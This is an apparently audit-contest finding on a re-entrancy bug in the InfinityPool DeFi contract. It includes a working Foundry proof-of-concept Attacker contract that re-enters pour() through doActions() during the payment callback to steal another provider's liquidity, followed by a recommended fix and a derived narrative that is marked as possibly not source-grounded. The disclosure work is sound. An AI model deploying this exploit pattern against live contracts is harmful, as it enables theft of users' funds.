---
id: 4763
severity: "High"
---

# An attacker can re-enter the InfinityPool contract to double account when adding liquidity Submitted by Spearmint, also found by ktl, yttriumzz, zigtur, joicygiore, Boraicho, ZC002, ustas, anonymousjoe and J4X

## Description

When a user adds liquidity through the pour() function, if they provide a data param then the token payment is expected to occur in a callback. The function will ensure that the difference in contract balance before and after the call back pays for the liquidity.
```solidity
if (data.length > 0) {
    uint256 balance0Before = IERC20(pool.token0).balanceOf(address(this));
    uint256 balance1Before = IERC20(pool.token1).balanceOf(address(this));
    IInfinityPoolPaymentCallback(msg.sender).infinityPoolPaymentCallback(expectedToken0, expectedToken1, data);
    if (expectedToken0 > 0 && IERC20(pool.token0).balanceOf(address(this)) < balance0Before + uint256(expectedToken0)) {
        revert UserPayToken0Mismatch(expectedToken0, expectedToken1);
    }
    if (expectedToken1 > 0 && IERC20(pool.token1).balanceOf(address(this)) < balance1Before + uint256(expectedToken1)) {
        revert UserPayToken1Mismatch(expectedToken0, expectedToken1);
    }
}
```
The issue is that during the callback an attacker can re-enter into the contract by adding liquidity through doActions to increase the contract token balance. Later they can withdraw liquidity from both positions to effectively steal from another LP. The attached proof of concept walks through the attack step by step.

## Proof of Concept

Add the following base contract to test/cantina:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import {Test, console, stdError} from "forge-std/Test.sol";
import {InfinityPoolsFactory} from "src/InfinityPoolsFactory.sol";
import {Token} from "src/mock/Token.sol";
import {Quad, fromUint256} from "src/types/ABDKMathQuad/Quad.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import {EPOCH} from "src/Constants.sol";
import {InfinityPoolsPeriphery, IPermit2} from "src/periphery/InfinityPoolsPeriphery.sol";
import {WETH9} from "src/periphery/mock/WETH9.sol";
import {IInfinityPoolsPeriphery} from "src/periphery/interfaces/IInfinityPoolsPeriphery.sol";
contract CorrectInfinityPoolsBase is Test {
    Token token0;
    Token token1;
    Token tokenBiggerThanWethImpl;
    Token tokenBiggerThanWeth;
    InfinityPoolsFactory infinityPoolsFactory;
    InfinityPool infinityPool;
    InfinityPoolsPeriphery infinityPoolsPeriphery;
    InfinityPool infinityPoolWeth;
    WETH9 WETH;
    // IERC20 version of WETH
    Token Ierc20Weth;

    function setUp() public virtual {
        vm.warp(uint256(EPOCH) + 1 days);
        token0 = new Token("Token0", "TOK0", 18);
        token1 = new Token("Token1", "TOK1", 18);
        WETH = new WETH9();
        Ierc20Weth = Token(address(WETH));
        // I needed WETH to be token0 to keep the test simple
        tokenBiggerThanWethImpl = new Token("TokenBIG", "TOKB", 18);
        bytes memory code = address(tokenBiggerThanWethImpl).code;
        address targetAddr = 0xf62849F9A0b5bF2913B396098f7c7019B51A820b;
        vm.etch(targetAddr, code);
        tokenBiggerThanWeth = Token(0xf62849F9A0b5bF2913B396098f7c7019B51A820b);
        infinityPoolsFactory = new InfinityPoolsFactory();
        infinityPoolsFactory.createPool(address(token0), address(token1), 15);
        address pool = infinityPoolsFactory.getPool(address(token0), address(token1), 15);
        assertTrue(pool != address(0));
        infinityPoolsFactory.createPool(address(WETH), address(token1), 15);
        infinityPool = InfinityPool(pool);
        infinityPoolsFactory.createPool(address(WETH), address(tokenBiggerThanWeth), 15);
        address poolWeth = infinityPoolsFactory.getPool(address(WETH), address(tokenBiggerThanWeth), 15);
        Quad startPrice = fromUint256(1);
        Quad quadVar = fromUint256(1);
        infinityPoolWeth = InfinityPool(poolWeth);
        infinityPoolWeth.setInitialPriceAndVariance(fromUint256(10000000), fromUint256(100));
        infinityPool.setInitialPriceAndVariance(startPrice, quadVar);
        infinityPoolsPeriphery = new InfinityPoolsPeriphery();
        infinityPoolsPeriphery.initialize(address(infinityPoolsFactory), address(WETH), IPermit2(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045));
    }
}
```
Add the following test file to test/cantina
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import {InfinityPoolsBase} from "test/cantina/InfinityPoolsBase.t.sol";
import {CorrectInfinityPoolsBase} from "test/cantina/CorrectBase.t.sol";
import {Quad, fromUint256, LibOptQuad} from "src/types/ABDKMathQuad/Quad.sol";
import {Test, console, stdError} from "forge-std/Test.sol";
import {InfinityPool} from "src/InfinityPool.sol";
import {Token} from "src/mock/Token.sol";
import {IInfinityPool} from "src/interfaces/IInfinityPool.sol";
import {InfinityPoolState} from "src/InfinityPoolState.sol";
import {Spot} from "src/libraries/external/Spot.sol";
contract POC is CorrectInfinityPoolsBase {
    address alice;
    Attacker attacker;

    function setUp() public override {
        super.setUp();
        // Setup innocent alice and the attacker contract
        alice = address(444);
        attacker = new Attacker(address(infinityPool), address(token0), address(token1));
        token0.mint(alice, 10e30);
        token1.mint(alice, 10e30);
        token0.mint(address(attacker), 10e30);
        token1.mint(address(attacker), 10e30);
        vm.startPrank(alice);
        token0.approve(address(infinityPool), 10e30);
        token1.approve(address(infinityPool), 10e30);
        vm.startPrank(address(attacker));
        token0.approve(address(infinityPool), 10e30);
        token1.approve(address(infinityPool), 10e30);
    }

    function test__ReEnterPourToDoubleAddLiquidity() external {
        // Alice calls `pour` to add liquidity
        vm.startPrank(alice);
        Quad liquidityAmount = fromUint256(1e7);
        infinityPool.pour(0, 1, liquidityAmount, "");
        // Log how many tokens alice transferred into the pool
        uint256 poolBalance0AfterAliceDeposits = token0.balanceOf(address(infinityPool));
        console.log("poolBalance0AfterAliceDeposits =%e", poolBalance0AfterAliceDeposits);
        // The attacker then performs the attack
        // see the `addLiquidity` implementation in the attack contract to follow the flow
        // basically the attacker calls pour, then within the callback `infinityPoolPaymentCallback`
        // they will pour again but through `doActions` since it does not have the nonReentrant modifier
        attacker.addLiquidity();
        // Log how many tokens are in the pool after the attacker adds liquidity
        uint256 poolBalance0AfterAttackerDeposits = token0.balanceOf(address(infinityPool));
        console.log("poolBalance0AfterAttackerDeposits =%e", poolBalance0AfterAttackerDeposits);
        // 2 days go by and the attacker calls `drain`
        vm.warp(block.timestamp + 2 days);
        attacker.drain();
        // The attacker calls `collect`
        // It will transfer him alice's deposit as well
        vm.warp(block.timestamp + 50 days);
        attacker.collect();
        // Log how many tokens are left for alice
        uint256 poolBalance0AfterAttack = token0.balanceOf(address(infinityPool));
        console.log("poolBalance0AfterAttack =%e", poolBalance0AfterAttack);
    }
}

contract Attacker {
    InfinityPool public immutable infinityPool;
    Token public immutable token0;
    Token public immutable token1;
    Quad liquidityAmount = fromUint256(1e7);

    constructor(address _infinityPool, address _token0, address _token1) {
        infinityPool = InfinityPool(_infinityPool);
        token0 = Token(_token0);
        token1 = Token(_token1);
    }

    function addLiquidity() external {
        bytes memory data = bytes("Code is Law");
        infinityPool.pour(0, 1, liquidityAmount, data);
    }

    function drain() external {
        infinityPool.drain(1, address(this), "");
        infinityPool.drain(2, address(this), "");
    }

    function collect() external {
        infinityPool.collect(1, address(this), "");
        infinityPool.collect(2, address(this), "");
    }

    function infinityPoolPaymentCallback(int256 amount0, int256 amount1, bytes calldata data) external {
        // Define the action and its corresponding data
        IInfinityPool.Action[] memory actions = new InfinityPool.Action[](1);
        actions[0] = IInfinityPool.Action.POUR;
        bytes[] memory actionDatas = new bytes[](1);
        actionDatas[0] = abi.encode(int256(0), int256(1), liquidityAmount);
        // Call doActions
        infinityPool.doActions(actions, actionDatas, address(this), "");
    }
}
```
Console output:
Ran 1 test for test/cantina/ReEnterPour.t.sol:POC
[PASS] test__ReEnterPourToDoubleAddLiquidity() (gas: 2867101)
Logs:
poolBalance0AfterAliceDeposits =1.874137988085946828e18
poolBalance0AfterAttackerDeposits =3.748275976171893656e18
poolBalance0AfterAttack =3.33e3
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.90ms (9.12ms CPU time)
Ran 1 test suite in 57.65ms (20.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

## Recommendation

Add the nonReentrant modifier to the doActions() function.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a re‑entrancy flaw in the InfinityPool contract that allows an attacker to double the amount of liquidity recorded for a position when adding liquidity through the pour() function. The pour() function accepts an optional data parameter; if data is supplied the contract makes an external call to the sender’s infinityPoolPaymentCallback. Inside this callback the attacker can invoke the pool’s doActions() function, which itself calls back into the pool to perform another pour operation. Because doActions() is not protected by a non‑reentrant guard, the second pour executes before the original pour finishes its balance checks. The contract records the token balances before the callback and expects the post‑callback balances to increase by the exact amounts supplied. By re‑entering and adding liquidity a second time, the attacker inflates the contract’s token balance, satisfies the balance checks, and later withdraws liquidity from both the original and the re‑entered positions. This results in the attacker receiving the original liquidity provider’s tokens in addition to their own, effectively stealing funds from honest LPs. The attack can be carried out whenever a user adds liquidity with a non‑empty data field, which triggers the callback, and the pool’s doActions() function lacks a re‑entrancy protection. The issue was discovered during a security audit and demonstrated with a concrete proof‑of‑concept test that shows the pool balance doubling after the malicious callback and the attacker’s final collection of the victim’s tokens. The bug is subtle because the balance verification logic only checks that the contract’s token balances have increased by at least the expected amounts, which the attacker can satisfy by manipulating the balance during the re‑entrancy. From a user’s perspective the symptoms are that after providing liquidity the pool’s token balance unexpectedly grows, and later the user’s deposited tokens disappear while the attacker’s balance increases. This violates the core accounting assumption that each liquidity addition corresponds to a one‑to‑one increase in pool balance and that withdrawals return only the provider’s own share. The recommended mitigation is to apply a nonReentrant modifier (or an equivalent re‑entrancy guard) to the doActions() function, or to restructure the code so that external calls are performed after all internal state updates, thereby preventing the contract from being re‑entered during the callback.
